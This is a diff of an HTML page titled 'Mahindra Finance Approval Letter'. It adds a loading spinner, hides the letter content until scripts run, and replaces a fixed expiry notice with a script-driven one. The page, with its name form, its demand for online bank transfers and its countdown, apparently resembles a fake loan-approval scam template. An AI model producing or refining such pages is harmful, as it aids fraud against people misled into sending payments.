@@ -4,10 +4,17 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <link rel="stylesheet" href="style.css">
-  <title>Mahindra Approval Letter</title>
+  <title>Mahindra Finance Approval Letter</title>
 </head>
 <body>
   
+  <div id="loader">
+    <div class="spinner"></div>
+    <div class="loading-text">Loading Page...</div>
+  </div>
+  
+  <div id="content" style="display: none;">
+    
   <div class="form">
     <form>
       <label for="name_input">Name</label>
@@ -113,9 +120,8 @@
     <p class="p3">Note:- Cash deposit not accepted by company (Online transaction needed for IMPS/NEFT/RTGS/MOBILE BANKING your Bank Account/ Transition Verification.)</p><br><br><br><br><br><br><br>
   
   </div><br><br><br><br><br><br><br>
-  
-  <marquee>This Page will be End on 2025-09-09 at 08:48.</marquee>
-  
+  </div>
+  <marquee id="expiry-date">Please wait...</marquee>
   
   <script src="main.js"></script>
 </body>
